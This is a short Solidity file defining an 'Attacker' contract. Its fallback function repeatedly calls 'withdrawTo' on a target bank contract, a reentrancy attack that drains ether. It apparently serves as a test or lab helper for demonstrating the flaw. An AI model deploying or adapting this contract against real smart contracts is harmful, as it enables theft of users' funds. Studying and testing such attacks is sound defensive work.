// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attacker {
    address bank;

    constructor(address _bank) {
        bank = _bank;
    }

    fallback() external payable {
        bank.call(abi.encodeWithSignature("withdrawTo(address,uint256)", address(this), 4 ether));
    }
}
